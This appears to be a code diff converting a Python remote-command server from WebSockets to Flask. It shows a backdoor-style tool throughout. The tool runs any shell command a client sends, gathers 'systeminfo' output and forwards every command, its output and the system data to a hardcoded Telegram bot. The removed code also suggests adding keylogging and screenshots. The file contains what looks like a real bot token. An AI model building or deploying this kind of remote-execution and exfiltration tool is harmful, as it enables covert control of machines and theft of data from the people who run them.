@@ -1,41 +1,29 @@
-import asyncio
-import websockets
-import json
-import os
-import telebot
+# Telegram Bot Configuration
+
+from flask import Flask, request, jsonify
 import subprocess
+import telebot
 from datetime import datetime
-from collections import deque
+import threading
 
 # Telegram Bot Configuration
-BOT_TOKEN = '7333847070:AAFUwJpWNvTZTQLVIsbcCicJZlWAmqFFNa4'
+BOT_TOKEN = '7333847070:AAFUwJpWNvTZTQLVIsbcCicJZlWAmqFFNa4'  # Replace with your bot token      # Replace with your chat ID
 CHAT_ID = '7416312733'
+
 bot = telebot.TeleBot(BOT_TOKEN)
 
 # Server Configuration
-PORT = 10000
-VALID_TOKENS = {"token123", "secureToken456", "clientABC789"}
-
-# WebSocket Clients
-clients = set()
+PORT = 5000  # Flask server port
+VALID_TOKENS = {"token123", "secureToken456", "clientABC789"}  # Example tokens
 
 # Command history
-command_history = deque(maxlen=100)
+command_history = []
 
-# Authentication Process
-def authenticate(client_socket):
-    try:
-        # Send an authentication request
-        client_socket.send(json.dumps({"command": "auth", "result": "Please authenticate with your token."}))
-        auth_message = client_socket.recv(1024)
-        auth_data = json.loads(auth_message)
-        if auth_data.get("command") == "auth" and auth_data.get("result") in VALID_TOKENS:
-            return True
-        return False
-    except Exception as e:
-        return False
+# Telegram Notification Function
+def send_to_telegram(message):
+    bot.send_message(CHAT_ID, message)
 
-# Execute shell commands and get output
+# Command Execution
 def execute_command(command):
     try:
         result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
@@ -43,57 +31,60 @@ def execute_command(command):
     except subprocess.CalledProcessError as e:
         return f"Error: {e.output.decode()}"
 
-# Send message to Telegram Bot
-def send_to_telegram(message):
-    bot.send_message(CHAT_ID, message)
+# HTTP Routes
+app = Flask(__name__)
 
-# WebSocket Handler
-async def handler(websocket, path):
-    clients.add(websocket)
-    print(f"Client connected: {websocket.remote_address}")
+@app.route('/authenticate', methods=['POST'])
+def authenticate():
+    data = request.json
+    token = data.get("token")
+    if token in VALID_TOKENS:
+        return jsonify({"status": "success", "message": "Authentication successful!"})
+    return jsonify({"status": "fail", "message": "Invalid token!"})
 
-    if authenticate(websocket):
-        await websocket.send(json.dumps({"command": "auth", "result": "Authentication successful."}))
-        send_to_telegram(f"🟢 New client connected: {websocket.remote_address}")
-        print(f"Client {websocket.remote_address} authenticated successfully.")
+@app.route('/exec', methods=['POST'])
+def execute():
+    data = request.json
+    token = data.get("token")
+    if token not in VALID_TOKENS:
+        return jsonify({"status": "fail", "message": "Authentication failed!"})
 
-        async for message in websocket:
-            data = json.loads(message)
-            if data['command'] == 'exec':
-                output = execute_command(data['result'])
-                await websocket.send(json.dumps({"command": "output", "result": output, "timestamp": str(datetime.now())}))
-                send_to_telegram(f"📩 Command executed on {websocket.remote_address}:\n{data['result']}\nOutput: {output}")
-            elif data['command'] == 'data':
-                # Collect data (e.g., system info, logs)
-                # You can expand this with other types of data collection (keylogs, screenshots, etc.)
-                system_info = subprocess.check_output("systeminfo", shell=True).decode()
-                await websocket.send(json.dumps({"command": "data", "result": system_info, "timestamp": str(datetime.now())}))
-                send_to_telegram(f"📩 Data from {websocket.remote_address}:\n{system_info}")
-            else:
-                await websocket.send(json.dumps({"command": "error", "result": "Unknown command"}))
-    else:
-        await websocket.send(json.dumps({"command": "auth", "result": "Authentication failed."}))
-        send_to_telegram(f"❌ Client {websocket.remote_address} failed authentication.")
+    command = data.get("command")
+    if not command:
+        return jsonify({"status": "fail", "message": "No command provided!"})
 
-    clients.remove(websocket)
-    print(f"Client disconnected: {websocket.remote_address}")
+    output = execute_command(command)
+    command_history.append({"command": command, "output": output, "timestamp": str(datetime.now())})
 
-# Start WebSocket Server
-async def start_server():
-    server = await websockets.serve(handler, "0.0.0.0", PORT)
-    await server.wait_closed()
+    # Send the output back to client and to Telegram
+    send_to_telegram(f"📩 Command executed:\n{command}\nOutput: {output}")
+    return jsonify({"status": "success", "message": "Command executed!", "output": output})
 
-# Run Telegram Bot
+@app.route('/data', methods=['POST'])
+def get_data():
+    data = request.json
+    token = data.get("token")
+    if token not in VALID_TOKENS:
+        return jsonify({"status": "fail", "message": "Authentication failed!"})
+
+    # Collect system data
+    try:
+        system_info = subprocess.check_output("systeminfo", shell=True).decode()
+        send_to_telegram(f"📩 System Data:\n{system_info}")
+        return jsonify({"status": "success", "message": "System data collected!", "data": system_info})
+    except Exception as e:
+        return jsonify({"status": "fail", "message": f"Failed to collect system data: {str(e)}"})
+
+# Telegram Bot Polling Function
 def run_bot():
     bot.polling()
 
+# Run Flask App
 if __name__ == "__main__":
-    import threading
-
-    # Run Telegram bot in a separate thread
+    # Start the Telegram bot in a separate thread
     bot_thread = threading.Thread(target=run_bot)
     bot_thread.daemon = True
     bot_thread.start()
 
-    # Start WebSocket server
-    asyncio.run(start_server())
+    # Run Flask app
+    app.run(host="0.0.0.0", port=PORT)
